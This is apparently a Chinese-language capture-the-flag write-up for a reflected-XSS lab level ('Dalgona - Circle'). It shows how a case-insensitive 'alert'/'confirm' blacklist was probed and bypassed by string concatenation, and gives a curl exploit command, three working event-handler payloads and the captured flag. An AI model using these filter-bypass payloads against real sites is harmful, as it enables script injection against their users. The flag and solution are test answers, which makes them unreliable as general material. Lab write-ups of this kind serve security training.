## 题解

### 入口与指纹

`Werkzeug/1.0.1` + `Python/2.7.18`，Dalgona 靶场第 5 关
（样式表 `static/css/xss/xss5.css`，标题 `Dalgona - Circle`）。

入口 `Page` → `GET /page?name=...`，反射在**文本节点**：

```html
<input type=text name=name placeholder="Enter your name..." > INPUT>
```

（结尾那个 `>` 是模板自带的。）

### 关键观察

**1. 没有字符级过滤，但有词级黑名单，命中就整段丢弃。**

`<`、`>`、`"`、`'`、空格全部可用（`<svg`、`<input`、`"XSS"` 都能原样反射）。
但只要输入里出现某些词，**整段输入消失**（不是替换该词，是整条丢弃）：

| 输入 | 反射 |
| --- | --- |
| `QalertQ` | （空） |
| `XalertX` | （空） |
| `ALERT` / `Alert` | （空） |
| `alert(1)` | （空） |
| `zzz alert zzz` | （空） |
| `confirm` | （空） |
| `prompt` | 保留 |
| `ale rt` / `a l e r t` / `al"ert` / `al\ert` | 保留（拆开就不命中） |
| `<script`、`<svg`、`<img`、`onfocus`、`onload`、`onerror`、`"XSS"` | 全部保留 |

所以黑名单是**大小写不敏感的 `alert` 和 `confirm` 两个字面量**，
而且"命中即丢弃整条输入"是这一关特有的处理方式
（004/008 的拒绝会回 `Sorry you can't use`，011/012 是静默改写）。

**2. 拆开字面量即可绕过。**

`'ale'+'rt'` 拼出来的字符串在运行时是 `alert`，但源码里没有连续子串 `alert`：

```text
top['ale'+'rt']     ==  window.alert
```

`'XSS'` 不受影响（`"XSS"` 探针原样保留），所以参数可以直接写字面量。

### 利用链

```bash
T=$(head -1 .target)
curl -sS --get \
  --data-urlencode "name=<svg/onload=top['ale'+'rt']('XSS')>" \
  "http://$T/page" \
| grep -o 'flag{[^}]*}'
```

响应：

```html
Congratulations!<p> Here is the flag: flag{5ed1cede-9aee-420e-ab55-1eacf8e8cd88}
```

三个等价载荷都验证通过：

```text
<input autofocus onfocus="top['ale'+'rt']('XSS')">
<svg/onload=top['ale'+'rt']('XSS')>
<body/onload=top['ale'+'rt']('XSS')>
```

成功响应的 `solution-text` 区块，`Here is the flag:` 之后。

## 复盘

- **黑名单有三种处置方式，判据各不相同。**
  - 拒绝（004/008）：回 `Sorry you can't use: 'x'`，能直接读出被拦的词；
  - 静默改写（011/012）：输入被删改，页面照常；
  - **整段丢弃（本题）**：输入完全消失，页面回到初始态。
  第三种最容易被误判成"注入不成立"，实际是"命中黑名单"。
- **区分"字符过滤"和"词过滤"。** 本题 `<`、`>`、引号、空格全都活着，
  说明不是字符集限制；而 `XalertX`、`zzz alert zzz` 也全被丢，
  说明它找的是**子串**而不是单词边界。这两点一测就清楚了。
- **词黑名单的标准解法是运行时拼接。** `'ale'+'rt'`、
  `'al'+'ert'`、`String.fromCharCode(97,108,101,114,116)` 都行；
  关键是源码层面不出现连续子串。
- **`XSS` 不需要拼接。** 我先确认 `Q"XSS"Q` 能原样反射，才知道只需处理 `alert`
  这一个词；如果不确认就一起去拼接，会白做功。
- **同一个靶场的每一关过滤都不一样。** 004 拦 `script/onerror/onload`、
  010 拦全部字母数字、011 删 `<[^>]+>`、012 删 `<[A-Za-z/]` 和带引号的 XSS、
  013 只拦 `alert`/`confirm`。**不能凭"同族"经验套用**，每关都要重新探。
